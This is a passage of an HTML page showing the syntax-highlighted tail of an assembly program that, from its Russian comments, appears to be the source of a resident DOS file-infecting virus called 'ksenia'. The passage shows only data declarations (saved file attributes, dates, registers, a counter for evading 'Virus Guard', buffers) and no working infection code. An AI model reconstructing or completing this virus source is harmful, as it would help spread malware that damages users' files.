 </span><span class="sc5">attrib</span><span class="sc0">                 </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">         </span><span class="sc1">; аттрибуты (ClrAttrib)</span><span class="sc0">
 </span><span class="sc5">time</span><span class="sc0">                   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">         </span><span class="sc1">; время файла (GetDate)</span><span class="sc0">
 </span><span class="sc5">date</span><span class="sc0">                   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">         </span><span class="sc1">; дата файла (GetDate)</span><span class="sc0">
 </span><span class="sc5">delta</span><span class="sc0">                  </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">         </span><span class="sc1">; +смещение (входной параметр NEXUS)</span><span class="sc0">
 </span><span class="sc5">w95state</span><span class="sc0">               </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">         </span><span class="sc1">; состояние Win95 (точнее WinOldAp)</span><span class="sc0">
 </span><span class="sc5">save_ax</span><span class="sc0">                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">         </span><span class="sc1">; передача параметров менеджера</span><span class="sc0">
 </span><span class="sc5">save_bx</span><span class="sc0">                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">         </span><span class="sc1">; резидентной части обработчикам</span><span class="sc0">
 </span><span class="sc5">save_es</span><span class="sc0">                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc5">delay</span><span class="sc0">                  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">         </span><span class="sc1">; счетчик для Virus Guard</span><span class="sc0">

 </span><span class="sc5">header</span><span class="sc0">                 </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">32</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
 </span><span class="sc5">buffer</span><span class="sc0">                 </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">vsize</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
 </span><span class="sc5">stacks</span><span class="sc0">                 </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">100h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

 </span><span class="sc5">eom</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc9">end</span><span class="sc0">     </span><span class="sc5">ksenia</span><span class="sc0">
</span></div></body>
</html>
